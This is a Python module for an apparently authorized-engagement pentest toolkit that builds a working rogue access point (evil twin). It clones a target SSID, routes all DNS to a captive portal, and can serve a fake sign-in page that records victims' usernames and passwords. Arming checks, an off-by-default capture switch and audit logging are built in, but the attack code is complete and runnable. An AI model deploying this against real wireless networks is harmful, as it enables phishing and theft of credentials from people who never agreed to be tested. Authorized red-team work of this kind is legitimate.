"""
rogueap.py — rogue AP / evil-twin for AUTHORIZED engagements only.

Stands up a soft AP (hostapd + dnsmasq) that clones an in-scope SSID and runs a
captive portal, to test client auto-association behavior and (with an explicit
opt-in) user susceptibility to a credential-capture portal.

An allowlist cannot perfectly bound a rogue AP — *clients* choose to associate —
so this module carries an extra, deliberate guardrail on top of the normal authz:

  1. The SSID must be in scope as an `ssid` entry (authz.is_ssid_authorized).
  2. The operator must ARM it: pass an authorization reference AND an explicit
     acknowledgment that they're authorized to impersonate this SSID. Nothing
     starts until armed.
  3. Credential capture is OFF by default — the portal shows a neutral
     authorized-assessment notice and only logs associations. Turning on the
     phishing page is a separate, acknowledged opt-in.
  4. Arm / start / stop / every association / every credential submission is
     written to the audit trail. There are no stealth/anti-logging options.

Requires AP-mode hardware (a USB adapter on the Pi Zero — the internal radio
can't), hostapd and dnsmasq. Missing any of these degrades to a clear error
rather than a crash; the gating logic itself is hardware-independent.
"""

import logging
import os
import shutil
import signal
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

import db

log = logging.getLogger("rogueap")

AP_IP = "10.0.0.1"
AP_NET = "10.0.0.0/24"
DHCP_LO, DHCP_HI = "10.0.0.50", "10.0.0.150"


class RogueAPEngine:
    def __init__(self, authz, db_path: str, iface: str = "wlan1",
                 enabled: bool = False, run_dir: str = "/tmp/radioman-rogueap"):
        self._authz = authz
        self._db_path = db_path
        self._iface = iface
        self.enabled = enabled
        self._run_dir = run_dir

        self._lock = threading.Lock()
        self._armed = False
        self._ssid = ""
        self._authref = ""
        self._channel = 6
        self._capture_creds = False
        self._running = False
        self._hostapd = None
        self._dnsmasq = None
        self._portal = None        # ThreadingHTTPServer
        self._portal_thread = None

    # ── Arming ─────────────────────────────────────────────────────────────────
    def arm(self, ssid: str, authref: str, acknowledge: bool,
            capture_creds: bool = False) -> dict:
        ssid = (ssid or "").strip()
        authref = (authref or "").strip()
        if not self.enabled:
            return {"ok": False, "error": "offensive mode disabled"}
        if not acknowledge:
            return {"ok": False, "error": "you must acknowledge you are authorized to impersonate this SSID"}
        if not authref:
            return {"ok": False, "error": "an authorization reference is required to arm"}
        ok, why = self._authz.is_ssid_authorized(ssid)
        if not ok:
            self._authz.audit("rogueap-arm", ssid, False, why)
            return {"ok": False, "error": why}
        with self._lock:
            self._armed = True
            self._ssid = ssid
            self._authref = authref
            self._capture_creds = bool(capture_creds)
        self._authz.audit("rogueap-arm", ssid, True,
                          f"auth={authref} creds={'on' if capture_creds else 'off'}")
        return {"ok": True, "armed": True, "ssid": ssid, "capture_creds": bool(capture_creds)}

    def disarm(self) -> dict:
        if self._running:
            self.stop()
        with self._lock:
            self._armed = False
            self._ssid = ""
            self._authref = ""
            self._capture_creds = False
        return {"ok": True, "armed": False}

    # ── Lifecycle ──────────────────────────────────────────────────────────────
    def start(self, channel: int = 6) -> dict:
        if not self.enabled:
            return {"ok": False, "error": "offensive mode disabled"}
        if not self._armed:
            return {"ok": False, "error": "arm the rogue AP first (authorize the SSID)"}
        if self._running:
            return {"ok": False, "error": "rogue AP already running"}
        for tool in ("hostapd", "dnsmasq"):
            if not shutil.which(tool):
                return {"ok": False, "error": f"{tool} not installed (sudo apt install {tool})"}
        if not os.path.isdir(f"/sys/class/net/{self._iface}"):
            return {"ok": False, "error": f"AP interface {self._iface} not found — attach an AP-capable USB adapter and set [offensive] ap_interface"}

        self._channel = int(channel)
        try:
            self._configure_iface()
            self._start_hostapd()
            self._start_dnsmasq()
            self._start_portal()
        except Exception as e:
            log.error("rogue AP start failed: %s", e)
            self.stop()
            return {"ok": False, "error": f"start failed: {e}"}

        self._running = True
        self._authz.audit("rogueap-start", self._ssid, True,
                          f"ch{self._channel} iface={self._iface} creds={'on' if self._capture_creds else 'off'}")
        return {"ok": True, "running": True, "ssid": self._ssid, "channel": self._channel}

    def stop(self) -> dict:
        for proc_attr in ("_hostapd", "_dnsmasq"):
            proc = getattr(self, proc_attr)
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            setattr(self, proc_attr, None)
        if self._portal:
            try:
                self._portal.shutdown()
            except Exception:
                pass
            self._portal = None
        try:
            subprocess.run(["ip", "addr", "flush", "dev", self._iface], capture_output=True)
        except Exception:
            pass
        was_running = self._running
        self._running = False
        if was_running:
            self._authz.audit("rogueap-stop", self._ssid, True, "")
        return {"ok": True, "running": False}

    def status(self) -> dict:
        return {
            "enabled": self.enabled,
            "armed": self._armed,
            "running": self._running,
            "ssid": self._ssid,
            "channel": self._channel,
            "iface": self._iface,
            "capture_creds": self._capture_creds,
            "authref": self._authref,
        }

    # ── Internals ──────────────────────────────────────────────────────────────
    def _configure_iface(self):
        subprocess.run(["ip", "link", "set", self._iface, "down"], capture_output=True)
        subprocess.run(["ip", "addr", "flush", "dev", self._iface], capture_output=True)
        subprocess.run(["ip", "addr", "add", f"{AP_IP}/24", "dev", self._iface], check=True)
        subprocess.run(["ip", "link", "set", self._iface, "up"], check=True)

    def _start_hostapd(self):
        os.makedirs(self._run_dir, exist_ok=True)
        conf = os.path.join(self._run_dir, "hostapd.conf")
        with open(conf, "w") as fh:
            fh.write(
                f"interface={self._iface}\n"
                f"driver=nl80211\n"
                f"ssid={self._ssid}\n"
                f"hw_mode=g\n"
                f"channel={self._channel}\n"
                f"auth_algs=1\n"
                f"ignore_broadcast_ssid=0\n"
            )
        self._hostapd = subprocess.Popen(
            ["hostapd", conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _start_dnsmasq(self):
        conf = os.path.join(self._run_dir, "dnsmasq.conf")
        with open(conf, "w") as fh:
            fh.write(
                f"interface={self._iface}\n"
                f"bind-interfaces\n"
                f"dhcp-range={DHCP_LO},{DHCP_HI},12h\n"
                f"dhcp-option=3,{AP_IP}\n"
                f"dhcp-option=6,{AP_IP}\n"
                f"address=/#/{AP_IP}\n"          # captive: all DNS → portal
            )
        self._dnsmasq = subprocess.Popen(
            ["dnsmasq", "-d", "-C", conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _start_portal(self):
        engine = self
        handler = _make_portal_handler(engine)
        self._portal = ThreadingHTTPServer((AP_IP, 80), handler)
        self._portal_thread = threading.Thread(
            target=self._portal.serve_forever, daemon=True, name="rogue-portal")
        self._portal_thread.start()

    # used by the portal handler
    def _log_client(self, mac, ip, ua):
        db.add_rogue_client(self._db_path, mac, ip, self._ssid, ua)

    def _log_capture(self, username, password, mac, ip):
        db.add_rogue_capture(self._db_path, self._ssid, username, password, mac, ip)
        self._authz.audit("rogueap-cred", self._ssid, True,
                          f"portal submission from {ip or mac or '?'}")


def _arp_lookup(ip: str) -> str:
    """Best-effort IP→MAC from the kernel ARP table; '' if unknown."""
    try:
        with open("/proc/net/arp") as fh:
            for line in fh.readlines()[1:]:
                parts = line.split()
                if parts and parts[0] == ip:
                    return parts[3].upper()
    except Exception:
        pass
    return ""


def _make_portal_handler(engine: "RogueAPEngine"):
    NOTICE = (
        "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
        "<title>Network notice</title>"
        "<div style='font-family:sans-serif;max-width:30rem;margin:3rem auto;padding:1.5rem'>"
        "<h2>Authorized security assessment</h2>"
        "<p>This wireless network is part of an authorized security test. "
        "Your connection has been logged. No further action is required.</p></div>"
    )

    def login_page(ssid):
        return (
            "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
            f"<title>Sign in to {ssid}</title>"
            "<div style='font-family:sans-serif;max-width:22rem;margin:3rem auto;padding:1.5rem'>"
            f"<h2>Sign in to {ssid}</h2>"
            "<form method=POST action=/login>"
            "<p><input name=username placeholder=Username style='width:100%;padding:.6rem;margin:.3rem 0'></p>"
            "<p><input name=password type=password placeholder=Password style='width:100%;padding:.6rem;margin:.3rem 0'></p>"
            "<p><button style='width:100%;padding:.6rem'>Connect</button></p>"
            "</form></div>"
        )

    class PortalHandler(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass  # silence default stderr logging

        def _client(self):
            ip = self.client_address[0]
            return _arp_lookup(ip), ip

        def do_GET(self):
            mac, ip = self._client()
            engine._log_client(mac, ip, self.headers.get("User-Agent", ""))
            body = (login_page(engine._ssid) if engine._capture_creds else NOTICE)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(body.encode("utf-8"))

        def do_POST(self):
            mac, ip = self._client()
            length = int(self.headers.get("Content-Length", 0) or 0)
            form = parse_qs(self.rfile.read(length).decode("utf-8", "ignore"))
            if engine._capture_creds and urlparse(self.path).path == "/login":
                engine._log_capture(
                    form.get("username", [""])[0], form.get("password", [""])[0], mac, ip)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<p style='font-family:sans-serif;margin:3rem'>Connecting...</p>")

    return PortalHandler
